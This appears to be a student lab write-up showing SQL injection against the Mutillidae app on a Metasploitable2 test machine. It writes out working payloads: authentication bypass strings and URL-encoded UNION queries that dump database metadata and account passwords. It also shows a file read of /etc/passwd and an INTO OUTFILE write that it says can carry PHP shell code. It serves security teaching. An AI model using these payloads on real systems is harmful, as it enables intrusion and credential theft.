# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection
vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. Identify IP address 
using ifconfig in Metasploitable2

![Screenshot 2024-04-28 130426](https://github.com/22008496/sqlinjection/assets/119476113/c9ef3163-9bb5-4d7b-ba7b-b39f2fc6d771)

Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.

![Screenshot 2024-04-28 130520](https://github.com/22008496/sqlinjection/assets/119476113/c7b48b89-c9dc-43d7-9dd7-f9bf8dcb25c7)

Select Multidae from the menu listed as shown above. You will get the page as displayed below:

![Screenshot 2024-04-28 130702](https://github.com/22008496/sqlinjection/assets/119476113/9c0b152f-dcdd-4240-9fd2-0f210075e080)

Click on the menu Login/Register and register for an account

![Screenshot 2024-04-28 130744](https://github.com/22008496/sqlinjection/assets/119476113/8cac2545-a496-470f-85e8-41df4cec5b80)

Click on the link “Please register here”

![Screenshot 2024-04-28 130829](https://github.com/22008496/sqlinjection/assets/119476113/1376bb93-ef75-4209-bbd4-64636724eb24)

Click on “Create Account” to display the following page:

![Screenshot 2024-04-28 134643](https://github.com/22008496/sqlinjection/assets/119476113/9a005f18-8e75-4477-ad38-6eefc7343776)


The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username
and secret key given by the client. Here is an outline of the page rationale:
($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or 
‘1’=’1) then try to log in, and you’ll be presented with an admin login page.

![Screenshot 2024-04-28 130937](https://github.com/22008496/sqlinjection/assets/119476113/6e025181-12c0-4823-9d9d-352ccdf45311)

Click “Login”. The logged in page will show as below:

![Screenshot 2024-04-28 131239](https://github.com/22008496/sqlinjection/assets/119476113/bab0b12d-ea1b-48e5-9d0d-cfc0e450935c)

## Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.

![Screenshot 2024-04-28 131429](https://github.com/22008496/sqlinjection/assets/119476113/b332ba98-7751-4843-a266-22804f00898e)

Click the login button and you will see it enter into the administrator page.

![Screenshot 2024-04-28 131521](https://github.com/22008496/sqlinjection/assets/119476113/a6bc7002-3b01-4952-aa95-c0c45a4c9617)

## Union-based SQL injection

UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the 
attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — 
Extract-Data/User Info”

After logging out, Now choose the menu as shown below:

![Screenshot 2024-04-28 131820](https://github.com/22008496/sqlinjection/assets/119476113/64a02cf1-8518-4bdc-ad52-c05a20be7e46)

![Screenshot 2024-04-28 131923](https://github.com/22008496/sqlinjection/assets/119476113/a3b39b81-e163-419b-9b86-9a1f64c9e431)

![Screenshot 2024-04-28 132004](https://github.com/22008496/sqlinjection/assets/119476113/77fe2955-62ab-424e-a2b0-304c3f60202d)

![Screenshot 2024-04-28 132103](https://github.com/22008496/sqlinjection/assets/119476113/c8204c2f-f23b-4aa5-886b-f2fdd3075466)

![Screenshot 2024-04-28 132158](https://github.com/22008496/sqlinjection/assets/119476113/fcc0c978-9255-4bca-a348-9c96be0815e3)

From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original 
query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.

![Screenshot 2024-04-28 132318](https://github.com/22008496/sqlinjection/assets/119476113/4db5b754-3897-420f-80ea-c0c4e0a5aa0c)

Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we 
incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details

![Screenshot 2024-04-28 132444](https://github.com/22008496/sqlinjection/assets/119476113/5e768fe1-938d-433e-b009-107cc6e23a45)

After adding the order by 6 into the existing url , the following error statement will be obtained:

![Screenshot 2024-04-28 132559](https://github.com/22008496/sqlinjection/assets/119476113/dd383dc9-528f-44f2-8a81-0be9abc0f1ef)

When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 

replacing 6.

![Screenshot 2024-04-28 132649](https://github.com/22008496/sqlinjection/assets/119476113/cd20b09f-b9d8-4208-aca3-817718661178)

As it is having 5 columns the query worked fine and it provides the correct result

![Screenshot 2024-04-28 132744](https://github.com/22008496/sqlinjection/assets/119476113/5a9cffa0-fd04-44aa-aedb-fec9336ed81f)

Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)

![Screenshot 2024-04-28 133102](https://github.com/22008496/sqlinjection/assets/119476113/e3de3c4b-d74a-4439-a74a-276a2b161529)

As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.

![Screenshot 2024-04-28 133208](https://github.com/22008496/sqlinjection/assets/119476113/5edd0a84-915f-4c86-a8f6-a07ad1d7a8e3)

Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details

![Screenshot 2024-04-28 133328](https://github.com/22008496/sqlinjection/assets/119476113/6333366d-72de-4058-a7e1-945e3e7bffa8)

The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains
all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-
info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details

![Screenshot 2024-04-28 133430](https://github.com/22008496/sqlinjection/assets/119476113/d80f5e45-32c3-4d2b-8c62-b50a7eade2f5)

The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.

![Screenshot 2024-04-28 133533](https://github.com/22008496/sqlinjection/assets/119476113/b73211d0-ce97-40bf-834f-14f39f617b29)

The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-
info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details

![Screenshot 2024-04-28 133723](https://github.com/22008496/sqlinjection/assets/119476113/f831fb87-9b10-497f-a8bd-3ee65a7f6974)

Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details

![Screenshot 2024-04-28 133803](https://github.com/22008496/sqlinjection/assets/119476113/91042180-0a7b-4fc1-ad80-7fd25289637a)

## Reading and writing files on the web-server

We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and 

passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details

![Screenshot 2024-04-28 133934](https://github.com/22008496/sqlinjection/assets/119476113/ffa599ad-b9a2-4ff4-aaae-65d265e41f33)

the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the 

“/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello 

World!’,null,null,null into outfile ‘/tmp/hello.txt’).






## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
